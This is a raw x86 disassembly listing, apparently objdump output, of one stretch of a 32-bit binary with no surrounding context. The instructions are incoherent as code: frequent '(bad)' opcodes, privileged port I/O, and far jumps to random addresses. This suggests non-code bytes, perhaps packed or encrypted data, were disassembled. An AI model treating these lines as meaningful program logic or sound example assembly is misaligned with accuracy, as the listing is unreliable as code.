  401a56:	adc    BYTE PTR [edx+eiz*1-0x28],dl
  401a5a:	dec    edi
  401a5b:	adc    esp,esp
  401a5d:	pop    edx
  401a5e:	(bad)  
  401a5f:	push   cs
  401a60:	push   ds
  401a61:	scas   eax,DWORD PTR es:[edi]
  401a62:	push   ss
  401a63:	inc    edx
  401a64:	push   eax
  401a65:	sub    eax,0x783eca06
  401a6a:	imul   edx,esp,0x4a
  401a6d:	mov    edx,0xc4738e2e
  401a72:	ins    BYTE PTR es:[edi],dx
  401a73:	mov    ecx,0x6476e7cf
  401a78:	shl    DWORD PTR [ebp+0x21aeba59],cl
  401a7e:	ror    BYTE PTR [ebx+0x0],1
  401a81:	lods   al,BYTE PTR ds:[esi]
  401a82:	enter  0x3491,0x39
  401a86:	push   ds
  401a87:	int    0x5e
  401a89:	fidivr DWORD PTR [ebp+0x4f]
  401a8c:	arpl   WORD PTR [eax+0x192c75dd],bp
  401a92:	mov    eax,ds:0x7adf3919
  401a97:	fwait
  401a98:	cmp    eax,0x9a8b9774
  401a9d:	cmp    dl,ch
  401a9f:	popf   
  401aa0:	add    bl,BYTE PTR [ecx]
  401aa2:	neg    BYTE PTR [ecx+0x4c]
  401aa5:	popf   
  401aa6:	fwait
  401aa7:	push   edi
  401aa8:	subps  xmm2,xmm1
  401aab:	jecxz  0x401aff
  401aad:	or     DWORD PTR [ebx],esi
  401aaf:	push   esp
  401ab0:	jp     0x401a46
  401ab2:	xor    edi,DWORD PTR [ebx]
  401ab4:	xor    DWORD PTR [edi-0x3602e722],esi
  401aba:	or     eax,0x783a516c
  401abf:	cld    
  401ac0:	cdq    
  401ac1:	(bad)  
  401ac2:	push   edi
  401ac3:	loope  0x401aef
  401ac5:	(bad)  
  401ac6:	pusha  
  401ac7:	mov    BYTE PTR [eax+0x44228c71],cl
  401acd:	mov    esi,0x633b05ef
  401ad2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401ad3:	add    DWORD PTR [edi+0x23],ebp
  401ad6:	adc    al,0xca
  401ad8:	mov    ecx,0x6bdef8a4
  401add:	adc    DWORD PTR [ecx-0xb],0xffffff90
  401ae1:	mov    bh,al
  401ae3:	or     esi,0x501a73f2
  401ae9:	inc    esi
  401aea:	(bad)  
  401aec:	add    dh,ah
  401aee:	push   esp
  401aef:	popf   
  401af0:	sub    al,0xdd
  401af2:	sbb    bl,BYTE PTR [edx+0x2f348dee]
  401af8:	ins    DWORD PTR es:[edi],dx
  401af9:	and    cl,BYTE PTR [ebp+0x7a]
  401afc:	(bad)  
  401afd:	and    dh,BYTE PTR [eax]
  401aff:	cld    
  401b00:	retf   
  401b01:	pop    ss
  401b02:	popf   
  401b03:	lea    ebp,[ebx+eax*4-0xcf5bd72]
  401b0a:	inc    eax
  401b0b:	dec    ecx
  401b0c:	pusha  
  401b0d:	sar    esi,1
  401b0f:	hlt    
  401b10:	adc    BYTE PTR [edx],0xb1
  401b13:	and    al,0xfb
  401b15:	in     eax,0x3a
  401b17:	je     0x401af4
  401b19:	stos   BYTE PTR es:[edi],al
  401b1a:	inc    ebp
  401b1b:	aas    
  401b1c:	sub    ch,BYTE PTR [ebx]
  401b1e:	lods   al,BYTE PTR ds:[esi]
  401b1f:	gs jnp 0x401b67
  401b22:	mov    cl,0x2e
  401b24:	pop    ebp
  401b25:	rcr    DWORD PTR [ebx+0x175a0a3b],cl
  401b2b:	mov    edi,0x1000d567
  401b30:	sub    ebp,ebx
  401b32:	pop    edi
  401b33:	lea    edi,ds:[esi-0x1fe144ce]
  401b3a:	aam    0x7
  401b3c:	inc    edi
  401b3d:	cmp    al,0xfd
  401b3f:	inc    esp
  401b40:	cdq    
  401b41:	mov    ah,0xb5
  401b43:	mov    BYTE PTR [edi-0x6ee8d24e],0x5d
  401b4a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401b4b:	fwait
  401b4c:	cli    
  401b4d:	and    ecx,DWORD PTR [esi-0x18832ab2]
  401b53:	add    al,0xab
  401b55:	hlt    
  401b56:	push   edi
  401b57:	inc    ecx
  401b58:	adc    ebx,DWORD PTR [eax-0x58]
  401b5b:	data16 fadd QWORD PTR [edi+0x74]
  401b5f:	dec    esi
  401b60:	mov    ds:0x3c517377,eax
  401b65:	and    BYTE PTR [ebx+0x13],bh
  401b68:	outs   dx,DWORD PTR ds:[esi]
  401b69:	rcr    bl,1
  401b6b:	cld    
  401b6c:	push   esp
  401b6d:	out    dx,al
  401b6e:	pusha  
  401b6f:	out    0xd6,al
  401b71:	fcom   QWORD PTR ds:0x218316a1
  401b77:	std    
  401b78:	sbb    al,BYTE PTR [edx]
  401b7a:	inc    edi
  401b7b:	sbb    edi,DWORD PTR [edx+0x7f]
  401b7e:	repnz and bh,al
  401b81:	icebp  
  401b82:	in     al,0x83
  401b84:	jmp    0xab298a57
  401b89:	cmp    al,0xea
  401b8b:	and    eax,0xaebf383a
  401b90:	adc    esp,esp
  401b92:	retf   0xa0f2
  401b95:	not    DWORD PTR [ecx]
  401b97:	mov    ecx,0xfac1e14
  401b9c:	sbb    bl,bl
  401b9e:	aad    0x6b
  401ba0:	clc    
  401ba1:	stos   BYTE PTR es:[edi],al
  401ba2:	cmp    dl,BYTE PTR [edi]
  401ba4:	jns    0x401b54
  401ba6:	stc    
  401ba7:	icebp  
  401ba8:	and    edx,DWORD PTR [edi-0xa]
  401bab:	jl     0x401be3
  401bad:	ret    
  401bae:	leave  
  401baf:	aas    
  401bb0:	sub    esi,DWORD PTR [edi]
  401bb2:	and    BYTE PTR [esi+0x3ccc34a2],bl
  401bb8:	mov    esp,0x9afee995
  401bbd:	push   eax
  401bbe:	lock nop
  401bc0:	icebp  
  401bc1:	sub    ch,BYTE PTR [ebx]
  401bc3:	sub    BYTE PTR [esp+edx*1-0x59],ah
  401bc7:	adc    esi,DWORD PTR [edx]
  401bc9:	or     dh,BYTE PTR [esi]
  401bcb:	or     eax,0x2e3547b9
  401bd0:	leave  
  401bd1:	out    dx,al
  401bd2:	fsub   DWORD PTR [edx]
  401bd4:	pop    edi
  401bd5:	add    al,cl
  401bd7:	mov    ah,0x4
  401bd9:	cwde   
  401bda:	int    0xfa
  401bdc:	(bad)  
  401bdd:	push   es
  401bde:	stos   DWORD PTR es:[edi],eax
  401bdf:	pop    ebp
  401be0:	ins    BYTE PTR es:[edi],dx
  401be1:	lods   al,BYTE PTR ds:[esi]
  401be2:	xor    eax,0x357d7184
  401be7:	ss mov dl,0xb5
  401bea:	inc    ebx
  401beb:	push   ebx
  401bec:	add    BYTE PTR [esi+ecx*8-0x3a5d32e7],0xac
  401bf4:	int3   
  401bf5:	push   edi
  401bf6:	jmp    0x82a1:0x5a71aa38
  401bfd:	xor    cl,BYTE PTR [esi]
  401bff:	(bad)  
  401c00:	fisttp QWORD PTR ds:0xa1321d1c
  401c06:	fwait
  401c07:	out    dx,al
  401c08:	std    
  401c09:	popa   
  401c0a:	clc    
  401c0b:	pop    ss
  401c0c:	das    
  401c0d:	bound  esi,QWORD PTR [edx]
  401c0f:	jle    0x401be6
  401c11:	jge    0x401bd7
  401c13:	pop    eax
  401c14:	xor    al,0x4
  401c16:	dec    edi
  401c17:	cwde   
  401c18:	and    dl,cl
  401c1a:	in     al,dx
  401c1b:	pop    eax
  401c1c:	sbb    DWORD PTR [eax-0x5864e78b],eax
  401c22:	push   ebx
  401c23:	push   edx
  401c24:	outs   dx,BYTE PTR ds:[esi]
  401c25:	xor    DWORD PTR [ecx+0x68d98a45],eax
  401c2b:	test   eax,0x13de0c02
  401c30:	cli    
  401c31:	mov    DWORD PTR [edi-0x72],0xf9f91ddd
  401c38:	sub    edx,DWORD PTR [ebx+ebx*8+0x4e]
  401c3c:	dec    edx
  401c3d:	xor    edx,0x4c188a15
  401c43:	mov    ah,bh
  401c45:	lock jg 0x401bc9
  401c48:	lock (bad) [eax+0x1e]
  401c4c:	pop    ss
  401c4d:	dec    esi
  401c4e:	icebp  
  401c4f:	and    DWORD PTR [eax-0x1f],esi
  401c52:	jmp    0x6563e97b
  401c57:	inc    eax
  401c58:	xor    BYTE PTR [ebx+ecx*4+0x1d],0xee
  401c5d:	in     eax,dx
  401c5e:	out    dx,al
  401c5f:	lea    ebp,[eax]
  401c61:	and    esi,DWORD PTR [ebx+0x4d920bf3]
  401c67:	ror    BYTE PTR [edi+0x6d],cl
  401c6a:	cmp    DWORD PTR [edx+esi*8],eax
  401c6d:	in     al,0x2e
  401c6f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401c70:	rcr    DWORD PTR [edx+0x34c8dcdb],cl
  401c76:	push   0xce3c9dd3
  401c7b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401c7c:	pop    edx
  401c7d:	cmp    BYTE PTR [ebp-0x43e8c94e],bh
  401c83:	push   ss
  401c84:	xchg   esp,eax
  401c85:	cmp    dl,BYTE PTR [edx]
  401c87:	add    ebx,DWORD PTR [edx]
  401c89:	jg     0x401d04
  401c8b:	inc    edi
  401c8c:	dec    BYTE PTR [ebp-0x44]
  401c8f:	std    
  401c90:	or     ebx,DWORD PTR [eax+0x37f9a0a4]
  401c96:	ins    BYTE PTR es:[edi],dx
  401c97:	adc    BYTE PTR [eax+0x5b],0x3b
  401c9b:	out    0x8,al
  401c9d:	pusha  
  401c9e:	ins    BYTE PTR es:[edi],dx
  401c9f:	fsub   QWORD PTR [esp+ecx*2]
  401ca2:	test   BYTE PTR [esi],ch
  401ca4:	mov    ch,0x27
  401ca6:	xchg   ebp,eax
  401ca7:	out    0x2a,eax
  401ca9:	or     cl,BYTE PTR [edi+0x22f67057]
  401caf:	mov    al,ds:0xed7b04b5
  401cb4:	imul   esp,DWORD PTR [esi],0xffffffde
  401cb7:	push   0x910b219b
  401cbc:	cmp    eax,0x29202419
  401cc1:	sti    
  401cc2:	xor    eax,0x9dbb5ca6
  401cc7:	mov    esp,0x62565e94
  401ccc:	mov    edx,0xde398429
  401cd1:	imul   ah
  401cd3:	sti    
  401cd4:	icebp  
  401cd5:	int    0x86
  401cd7:	arpl   WORD PTR [ecx-0x54],bx
  401cda:	je     0x401d2a
  401cdc:	dec    esi
  401cdd:	xchg   edx,eax
  401cde:	mov    ds:0xa6d962a4,al
  401ce3:	pop    ebx
  401ce4:	mov    al,ds:0x1bb95677
  401ce9:	xor    ch,bl
  401ceb:	call   0x678e:0xb0c594a4
  401cf2:	dec    ebx
  401cf3:	test   BYTE PTR [esi+0x60143c3c],ch
  401cf9:	sub    al,0x4d
  401cfb:	(bad)  
  401cfc:	mov    gs:0xf974f4ea,al
  401d02:	xchg   edx,eax
  401d03:	xchg   edi,eax
  401d04:	sbb    DWORD PTR [edx-0xe],eax
  401d07:	mov    eax,ds:0xa565fba4
  401d0c:	xor    al,0x71
  401d0e:	dec    esi
  401d0f:	mov    ds:0x616b2aa5,eax
  401d14:	icebp  
  401d15:	xchg   edi,eax
  401d16:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401d17:	cli    
  401d18:	mov    cl,BYTE PTR [esi+0x27]
  401d1b:	and    edi,eax
  401d1d:	dec    edx
  401d1e:	pop    edi
  401d1f:	cs jo  0x401cac
  401d22:	xchg   DWORD PTR [eax+0x90bb410],ecx
  401d28:	fs and cl,cl
  401d2b:	xchg   esi,eax
  401d2c:	mov    eax,0xe6966e39
  401d31:	cmp    edx,edx
  401d33:	dec    esp
  401d34:	out    0x2e,al
  401d36:	mov    dl,0x57
  401d38:	imul   ebx,ecx,0xb243e055
  401d3e:	jmp    0xa8ea025b
  401d43:	inc    eax
  401d44:	mov    ch,0x2d
  401d46:	cmp    edx,DWORD PTR [ebx+ecx*4+0xda5c9f7]
  401d4d:	int    0x12
  401d4f:	retf   0x3207
  401d52:	ret    0x2b88
  401d55:	and    DWORD PTR [edi+esi*1],0x31
  401d59:	jle    0x401d6e
  401d5b:	aam    0x5b
  401d5d:	pop    ecx
  401d5e:	(bad)  
  401d5f:	sub    al,0xc1
  401d61:	fmul   DWORD PTR [ebx+0x79]
  401d64:	aam    0xd
  401d66:	or     eax,0x8c88af2c
  401d6b:	bound  ebx,QWORD PTR [edi-0x6a2a5504]
  401d71:	arpl   WORD PTR [eax],bp
  401d73:	cdq    
  401d74:	out    dx,al
  401d75:	add    eax,0x8a679688
  401d7a:	(bad)  
  401d7b:	sar    DWORD PTR [esi-0x25],0x29
  401d7f:	mov    edx,0x7f6ecf35
  401d84:	inc    eax
  401d85:	adc    eax,0x9cb63d65
  401d8a:	lods   al,BYTE PTR ds:[esi]
  401d8b:	ja     0x401d6a
  401d8d:	push   ecx
  401d8e:	(bad)  
  401d8f:	sub    DWORD PTR [ecx+0x22],ecx
  401d92:	lea    edx,[ecx]
  401d94:	or     ecx,DWORD PTR [edi+0x2efe070d]
  401d9a:	fs test eax,0xfe9e9af3
  401da0:	mov    esp,0xee95b341
  401da5:	fiadd  DWORD PTR [eax+0xeee0974]
  401dab:	call   0x595c:0x7f709d31
  401db2:	outs   dx,DWORD PTR ds:[esi]
  401db3:	lods   al,BYTE PTR fs:[esi]
  401db5:	fstp   QWORD PTR [edi-0xacdc14c]
  401dbb:	inc    esi
  401dbc:	pusha  
  401dbd:	cld    
  401dbe:	mov    cl,0xe5
  401dc0:	pusha  
  401dc1:	sar    ch,cl
  401dc3:	jb     0x401e04
  401dc5:	cli    
  401dc6:	jno    0x401d80
  401dc8:	ins    DWORD PTR es:[edi],dx
  401dc9:	and    eax,0x119cc389
  401dce:	fwait
  401dcf:	add    DWORD PTR [edx-0x37],ebp
  401dd2:	mov    BYTE PTR [edx+0x1a],bl
  401dd5:	mov    BYTE PTR es:[eax+0x61c4cfa5],0x49
  401ddd:	inc    esi
  401dde:	dec    eax
  401ddf:	cdq    
  401de0:	mov    DWORD PTR [ebp+0x6a87aec4],0x3c3ee712
  401dea:	out    0x43,eax
  401dec:	and    BYTE PTR [edx-0x1982b737],bh
  401df2:	jns    0x401e0d
  401df4:	in     al,0xe7
  401df6:	push   ebx
  401df7:	fsubr  DWORD PTR [edi+0x71c2f796]
  401dfd:	mov    dh,0xdd
  401dff:	sbb    eax,0x7990daca
  401e04:	in     al,0xbd
  401e06:	push   esp
  401e07:	or     eax,0x3945615d
  401e0c:	jle    0x401dc1
  401e0e:	aaa    
  401e0f:	sbb    ch,bl
  401e11:	call   0x66a6:0xfeb55b55
  401e18:	std    
  401e19:	jle    0x401e6e
  401e1b:	test   al,0x85
  401e1d:	pop    esp
  401e1e:	fcomp  st(4)
  401e20:	dec    ecx
  401e21:	xchg   edx,eax
  401e22:	cmp    DWORD PTR [edi],eax
  401e24:	rol    ebp,0xda
  401e27:	ret    
  401e28:	xlat   BYTE PTR ds:[ebx]
  401e29:	cwde   
  401e2a:	jns    0x401e64
  401e2c:	mov    al,BYTE PTR [eax+0x6381599c]
  401e32:	outs   dx,DWORD PTR es:[esi]
  401e34:	mov    ah,0xd7
  401e36:	popf   
  401e37:	lock enter 0x5473,0x48
  401e3c:	cmp    BYTE PTR [esi+ebx*8+0x2865835c],dl
  401e43:	inc    ecx
  401e44:	shl    DWORD PTR [edi-0x8],1
  401e47:	jle    0x401ebe
  401e49:	add    eax,0x234409c1
  401e4e:	pop    edi
  401e4f:	add    eax,edi
  401e51:	xchg   edx,eax
  401e52:	push   cs
  401e53:	lahf   
  401e54:	dec    edx
  401e55:	imul   edi,DWORD PTR ss:[ecx-0x3a],0xdd137306
  401e5d:	sbb    al,0x56
  401e5f:	jo     0x401ec3
  401e61:	stc    
  401e62:	mov    eax,0x111236e0
  401e67:	xchg   esp,eax
  401e68:	idiv   BYTE PTR [esi+ebp*8-0x7c]
  401e6c:	clc    
  401e6d:	mov    al,ds:0xda23f11e
  401e72:	push   esi
  401e73:	in     eax,0xd8
  401e75:	and    edx,eax
  401e77:	ret    0xd51f
  401e7a:	mov    esp,0xab111a1f
  401e7f:	dec    edi
  401e80:	ja     0x401e89
  401e82:	cmp    al,0x77
  401e84:	push   esp
  401e85:	fsub   QWORD PTR [ebp-0x2e]
  401e88:	int    0xb9
  401e8a:	sub    eax,0x3b7e7568
  401e8f:	cmc    
  401e90:	lods   eax,DWORD PTR ds:[esi]
  401e91:	aaa    
  401e92:	cmp    BYTE PTR [eax+eax*1+0x7e],bl
  401e96:	mov    ds:0x8fc5cf2b,eax
  401e9b:	(bad)  
  401e9c:	enter  0x9d0,0x13
  401ea0:	push   ds
  401ea1:	add    edx,0xb0dbe304
  401ea7:	cmp    eax,0x46dfab33
  401eac:	call   FWORD PTR [eax-0x66d04a5c]
  401eb2:	inc    ebx
  401eb3:	fsubr  st,st(5)
  401eb5:	arpl   WORD PTR [esi-0x7c98341],di
  401ebb:	xchg   ebx,eax
  401ebc:	mov    bh,0xd2
  401ebe:	ret    0xef09
  401ec1:	push   ds
  401ec2:	xor    al,0x7f
  401ec4:	int    0x17
  401ec6:	adc    bh,BYTE PTR [ebp+0x20]
  401ec9:	fs push eax
  401ecb:	stc    
  401ecc:	push   ecx
  401ecd:	lahf   
  401ece:	mov    esp,0x14489092
  401ed3:	cmp    ch,ah
  401ed5:	js     0x401f55
  401ed7:	iret   
  401ed8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401ed9:	jecxz  0x401ecf
  401edb:	lock aam 0xe8
  401ede:	cmp    bl,dh
  401ee0:	push   ecx
  401ee1:	mov    cs,WORD PTR [edi+ebx*1+0x4ff5a452]
  401ee8:	push   es
  401ee9:	cld    
  401eea:	and    ebx,edx
  401eec:	cmp    eax,0x9c294314
  401ef1:	mov    dh,BYTE PTR ds:0x8c980a81
  401ef7:	jle    0x401f42
  401ef9:	daa    
  401efa:	or     DWORD PTR [esi+ebx*8],esi
  401efd:	daa    
  401efe:	sub    DWORD PTR [esi],edi
  401f00:	xchg   DWORD PTR [esi+0x62],edx
  401f03:	xchg   ecx,eax
  401f04:	inc    ebp
  401f05:	rol    BYTE PTR [edi],cl
  401f07:	jmp    0x3e51:0xd1e1c7c9
  401f0e:	jp     0x401f56
  401f10:	cli    
  401f11:	fadd   QWORD PTR [ecx]
  401f13:	bound  eax,QWORD PTR [ebx+0x18cf19e3]
  401f19:	paddd  mm1,QWORD PTR [ebx-0xf731301]
  401f20:	nop
  401f21:	lods   eax,DWORD PTR ds:[esi]
  401f22:	fmul   DWORD PTR ss:[ebx]
  401f25:	mov    bh,0xc8
  401f27:	lods   eax,DWORD PTR ds:[esi]
  401f28:	arpl   dx,bx
  401f2a:	rcr    DWORD PTR [eax+0x59],cl
  401f2d:	(bad)  
  401f2e:	stc    
  401f2f:	hlt    
  401f30:	add    al,0x77
  401f32:	add    dh,BYTE PTR ds:0x550a4659
  401f38:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401f39:	fldcw  WORD PTR [edx-0x23629765]
  401f3f:	add    edx,eax
  401f41:	sub    DWORD PTR [ebx-0x53],ebx
  401f44:	int    0x51
  401f46:	call   0x85e86c1c
  401f4b:	fimul  WORD PTR [edx-0x25]
  401f4e:	jnp    0x401ee8
  401f50:	pop    es
  401f51:	repnz ins BYTE PTR es:[edi],dx
  401f53:	push   edi
  401f54:	mov    ebx,0x8a0a20d0
  401f59:	pushf  
  401f5a:	push   ecx
  401f5b:	mov    DWORD PTR [edx+0x34],esp
  401f5e:	and    ebp,ebp
  401f60:	mov    esp,0x48535209
  401f65:	dec    esp
  401f66:	sub    BYTE PTR [edi-0x3e],al
  401f69:	or     al,0x95
  401f6b:	mov    BYTE PTR [ebx+0x5e5ab66b],bl
  401f71:	add    DWORD PTR [ecx+0x3c],esp
  401f74:	push   edi
  401f75:	mov    ah,0xa0
  401f77:	stos   DWORD PTR es:[edi],eax
  401f78:	fcomp  QWORD PTR [esp+edx*2]
  401f7b:	sub    al,0xfd
  401f7d:	aaa    
  401f7e:	mov    bl,0xa
  401f80:	or     edx,eax
  401f82:	pop    edi
  401f83:	mov    ebp,0x857aeeaf
  401f88:	inc    ebp
  401f89:	cwde   
  401f8a:	sbb    esi,DWORD PTR [edx-0x24]
  401f8d:	push   0x9bcf4f98
  401f92:	fimul  DWORD PTR [ecx-0x6d84141b]
  401f98:	inc    edx
  401f99:	pop    edx
  401f9a:	cwde   
  401f9b:	ror    BYTE PTR [edi],0xe0
  401f9e:	pop    esi
  401f9f:	and    edx,ecx
  401fa1:	enter  0x4eff,0x18
  401fa5:	and    DWORD PTR [ebp-0x75],eax
  401fa8:	add    eax,0x4422e08a
  401fad:	push   ebx
  401fae:	inc    esp
  401faf:	repz enter 0xfc94,0xa1
  401fb4:	add    cl,0x29
  401fb7:	and    DWORD PTR [ebx+0x16],ebx
  401fba:	jno    0x402016
  401fbc:	aad    0x6f
  401fbe:	push   esp
  401fbf:	in     al,dx
  401fc0:	mov    eax,ds:0xeeb8ee50
  401fc5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401fc6:	imul   ebp,edi,0xffffffb5
  401fc9:	pop    eax
  401fca:	sbb    cl,BYTE PTR [ebp-0x41]
  401fcd:	sbb    al,0x8e
  401fcf:	dec    ebx
  401fd0:	sub    BYTE PTR [eax+0x36768388],bl
  401fd6:	mov    DWORD PTR [edi+0x4],0xb2e55199
  401fdd:	push   edi
  401fde:	mov    edx,0xc7223db
  401fe3:	jnp    0x401fac
  401fe5:	inc    edx
  401fe6:	scas   eax,DWORD PTR es:[edi]
  401fe7:	sbb    DWORD PTR [ebx-0xbb01960],ecx
  401fed:	sbb    ch,ch
  401fef:	mov    esp,0xf5681641
  401ff4:	popa   
  401ff5:	jmp    0x402001
  401ff7:	test   DWORD PTR [edx+0x37f5351d],esp
  401ffd:	dec    ebx
  401ffe:	fidiv  DWORD PTR [edx]
  402000:	js     0x402027
  402002:	lods   al,BYTE PTR ds:[esi]
  402003:	lds    ecx,FWORD PTR [esi+eiz*4+0x67d46970]
  40200a:	xchg   esp,eax
  40200b:	push   ecx
  40200c:	imul   ebp,DWORD PTR [esi-0x4a7aed26],0x2d4616ee
  402016:	aaa    
  402017:	je     0x401fe3
  402019:	adc    al,0x6b
  40201b:	aaa    
  40201c:	or     eax,0x6c7b3482
  402021:	repnz and edx,0x8249e8f9
  402028:	imul   ebx,esi,0xffffffef
  40202b:	fstp   DWORD PTR [eax]
  40202d:	cmp    esi,DWORD PTR [edi-0x56]
  402030:	addr16 pop ebx
  402032:	mov    edx,0xb1121117
  402037:	lods   eax,DWORD PTR ds:[esi]
  402038:	(bad)  
  402039:	push   0xe0b5139d
  40203e:	div    BYTE PTR [edi]
  402040:	imul   edx,DWORD PTR [edx-0x18],0xebf5ae48
  402047:	ja     0x401fe3
  402049:	and    al,0x0
  40204b:	add    DWORD PTR [ecx],ecx
  40204d:	or     eax,0x34fed23a
  402052:	push   esi
  402053:	(bad)  
  402054:	jl     0x402068
  402056:	jnp    0x4020be
  402058:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402059:	pop    es
  40205a:	adc    BYTE PTR [esi+0x5099fd9d],0xba
  402061:	iret   
  402062:	mov    bl,0x67
  402064:	mov    ch,0x87
  402066:	(bad)  
  402067:	loope  0x40206e
  402069:	push   edx
  40206a:	iret   
  40206b:	and    eax,0x3d3b32db
  402070:	mov    al,ds:0xcb9d2f11
  402075:	scas   eax,DWORD PTR es:[edi]
  402076:	inc    ebp
  402077:	jo     0x402002
  402079:	adc    BYTE PTR [ecx+ecx*2-0xb5e0f00],bl
  402080:	xchg   ecx,eax
  402081:	sbb    ah,0xef
  402084:	mov    al,ds:0x490fbab2
  402089:	mov    bl,0x47
  40208b:	(bad)  [ebp+0x428960b9]
  402091:	dec    esi
  402092:	(bad)  [esi-0x43]
  402095:	cwde   
  402096:	repz iret 
  402098:	inc    ebx
  402099:	or     dh,BYTE PTR [eax+edi*1+0x28]
  40209d:	hlt    
  40209e:	mov    ecx,0x7eef9ffb
  4020a3:	mov    eax,ds:0x785b7acc
  4020a8:	scas   al,BYTE PTR es:[edi]
  4020a9:	js     0x402108
  4020ab:	jne    0x40202e
  4020ad:	lods   al,BYTE PTR ds:[esi]
  4020ae:	mov    ch,0xc5
  4020b0:	imul   edi,esp,0xd2cdd719
  4020b6:	adc    DWORD PTR [edx],0x84770b1d
  4020bc:	(bad)  
  4020bd:	xchg   ecx,eax
  4020be:	loope  0x402045
  4020c0:	jae    0x402087
  4020c2:	(bad)  
  4020c3:	cmc    
  4020c4:	mov    ah,0xa5
  4020c6:	js     0x40213f
  4020c8:	mov    BYTE PTR [edi-0x17],ch
  4020cb:	js     0x402145
  4020cd:	jb     0x4020d3
  4020cf:	ds scas eax,DWORD PTR es:[edi]
  4020d1:	(bad)  
  4020d2:	in     eax,dx
  4020d3:	mov    cl,0x80
  4020d5:	stos   BYTE PTR es:[edi],al
  4020d6:	sahf   
  4020d7:	or     ebp,DWORD PTR [ebp+0x5d]
  4020da:	(bad)  
  4020db:	jmp    0x960a:0x1fc8a592
  4020e2:	mov    ds:0xa1f6a1af,eax
  4020e7:	mov    eax,ds:0xb48c9d3
  4020ec:	imul   esi,DWORD PTR [edx],0x3a
  4020ef:	cmc    
  4020f0:	in     al,0x1b
  4020f2:	jmp    0xa780208e
  4020f7:	ins    DWORD PTR es:[edi],dx
  4020f8:	sub    al,0xcd
  4020fa:	or     al,0x74
  4020fc:	and    bh,BYTE PTR [eax]
  4020fe:	fs or  eax,edx
  402101:	jb     0x40211d
  402103:	add    al,0xf9
  402105:	js     0x40215c
  402107:	xor    dl,BYTE PTR [eax+0x549624a5]
  40210d:	inc    esi
  40210e:	xor    ecx,esp
  402110:	mov    ch,0xe8
  402112:	mov    edx,DWORD PTR [ebp-0x2c355c95]
  402118:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402119:	jb     0x4020f6
  40211b:	ret    
  40211c:	(bad)  
  40211d:	test   al,0x8
  40211f:	lahf   
  402120:	mov    ds:0x831e9718,eax
  402125:	bound  edi,QWORD PTR [eax]
  402127:	lahf   
  402128:	test   eax,0x7ce022f7
  40212d:	sbb    eax,esi
  40212f:	retf   
  402130:	rol    BYTE PTR ss:[eax-0x65],1
  402134:	cld    
  402135:	mov    ds:0x14f29122,al
  40213a:	jnp    0x40210e
  40213c:	sbb    ch,dl
  40213e:	or     ebp,esi
  402140:	adc    dl,bh
  402142:	pop    esi
  402143:	popa   
  402144:	imul   edx,DWORD PTR [edi+0x39],0xffffff97
  402148:	pop    ebx
  402149:	and    ebx,ebx
  40214b:	mov    al,BYTE PTR [ebx+ecx*4-0x6079f972]
  402152:	scas   al,BYTE PTR es:[edi]
  402153:	push   ds
  402154:	mov    ecx,0x54be715f
  402159:	pop    es
  40215a:	sbb    DWORD PTR [edi+0x1bde7549],ecx
  402160:	add    ebx,ebx
  402162:	ds jecxz 0x402109
  402165:	or     esi,esi
  402167:	xor    al,0xb6
  402169:	push   0xdb163e5c
  40216e:	push   ebx
  40216f:	scas   eax,DWORD PTR es:[edi]
  402170:	scas   eax,DWORD PTR es:[edi]
  402171:	popa   
  402172:	xchg   ecx,eax
  402173:	lods   al,BYTE PTR ds:[esi]
  402174:	addr16 into 
  402176:	xchg   esp,eax
  402177:	add    eax,0xce7dc939
  40217c:	mov    al,0x39
  40217e:	add    WORD PTR [ebp+0x77],cx
  402182:	mov    WORD PTR [edi-0x60],?
  402185:	fs ins BYTE PTR es:[edi],dx
  402187:	mov    ebp,0x7d4c879
  40218c:	dec    esi
  40218d:	mov    eax,0x8f628487
  402192:	aaa    
  402193:	lods   eax,DWORD PTR ds:[esi]
  402194:	push   ebx
  402195:	xor    eax,DWORD PTR [edx+0x49390f2e]
  40219b:	add    esp,DWORD PTR [bp+si]
  40219e:	xchg   DWORD PTR [ecx-0x48],edi
  4021a1:	adc    DWORD PTR [edx-0x59a22acb],ecx
  4021a7:	and    DWORD PTR [edi],0xd93e67bf
  4021ad:	or     eax,0xaac0e50
  4021b2:	(bad)  
  4021b3:	jb     0x40216f
  4021b5:	xor    DWORD PTR [edx+0x6b38e06c],edx
  4021bb:	fisub  WORD PTR [ebx]
  4021bd:	cdq    
  4021be:	inc    edx
  4021bf:	bound  ecx,QWORD PTR [edi]
  4021c1:	cmp    eax,0x6397a34a
  4021c6:	aad    0xdf
  4021c8:	xor    eax,0xf1557a4
  4021cd:	mov    DWORD PTR ds:0x929fea17,esp
  4021d3:	nop
  4021d4:	push   esi
  4021d5:	push   ecx
  4021d6:	add    ch,al
  4021d8:	ror    BYTE PTR [ecx],0xd6
  4021db:	dec    eax
  4021dc:	fst    DWORD PTR [eax]
  4021de:	sahf   
  4021df:	call   0xbab7a4ce
  4021e4:	fdivr  QWORD PTR [ecx-0x2c]
  4021e7:	cmp    dl,bh
  4021e9:	mov    BYTE PTR [esp+0x1435106a],bl
  4021f0:	or     esi,DWORD PTR [ebp-0x786b49cd]
  4021f6:	call   0x6d11:0xdc0a4a0
  4021fd:	mov    eax,0xe6f1f3fd
  402202:	add    bh,ah
  402204:	cs out 0x3b,al
  402207:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402208:	xor    ah,BYTE PTR [edi]
  40220a:	in     eax,dx
  40220b:	scas   eax,DWORD PTR es:[edi]
  40220c:	out    0x4e,al
  40220e:	call   0x28a8:0x40256002
  402215:	push   edi
  402216:	dec    edx
  402217:	push   edx
  402218:	in     eax,dx
  402219:	test   eax,0xeff9711c
  40221e:	mov    al,ds:0x47830698
  402223:	stos   DWORD PTR es:[edi],eax
  402224:	mov    cl,0x46
  402226:	cwde   
  402227:	sti    
  402228:	pop    edi
  402229:	(bad)  
  40222a:	das    
  40222b:	mov    ebp,0xe72a9863
  402230:	xor    eax,DWORD PTR [eax+0x19ee49a1]
  402236:	hlt    
  402237:	sbb    DWORD PTR ds:0x2908aa2d,ecx
